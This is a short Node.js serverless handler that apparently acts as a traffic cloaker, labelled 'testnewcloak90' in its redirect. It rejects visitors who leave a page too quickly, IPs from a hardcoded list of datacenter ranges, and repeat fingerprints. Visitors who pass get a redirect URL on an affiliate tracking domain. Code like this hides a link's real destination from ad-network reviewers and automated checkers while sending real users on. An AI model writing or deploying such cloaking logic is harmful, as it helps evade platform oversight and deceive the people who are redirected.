module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { timeOnPage, fingerprint } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';

  console.log('Request from IP:', ip, 'Time:', timeOnPage);

  // Time check
  if (!timeOnPage || timeOnPage < 2000) {
    console.log('Blocked: Too fast');
    return res.status(400).json({ error: 'Too fast' });
  }

  // IP check
  const datacenterRanges = ['216.244.66', '159.89', '134.122', '167.172', '138.197', '157.245', '104.248', '206.189'];
  const isBot = datacenterRanges.some(range => ip.startsWith(range));
  
  if (isBot) {
    console.log('Blocked: Bot IP');
    return res.status(403).json({ error: 'Blocked' });
  }

  // Rate limiting (simple in-memory)
  if (!global.requestLog) global.requestLog = new Map();
  
  const rateLimitKey = `${ip}-${JSON.stringify(fingerprint)}`;
  const now = Date.now();
  const record = global.requestLog.get(rateLimitKey);
  
  if (record && record.count >= 2 && (now - record.firstRequest) < 3600000) {
    console.log('Blocked: Rate limited');
    return res.status(429).json({ error: 'Rate limited' });
  }
  
  if (!record) {
    global.requestLog.set(rateLimitKey, { count: 1, firstRequest: now });
  } else {
    if ((now - record.firstRequest) >= 3600000) {
      global.requestLog.set(rateLimitKey, { count: 1, firstRequest: now });
    } else {
      record.count++;
    }
  }

  // Generate redirect
  const token = Math.random().toString(36).substring(2) + Date.now().toString(36);
  const redirectUrl = `https://t.afftrackr.com/?bbz=whsZesGHt%2b5bYZDac%2boZs1%2bpc7tdAT1SvQJDRoz7h5U%3d&s1=testnewcloak90&t=${token}`;

  console.log('Approved: Redirecting');
  return res.status(200).json({ redirectUrl });
};
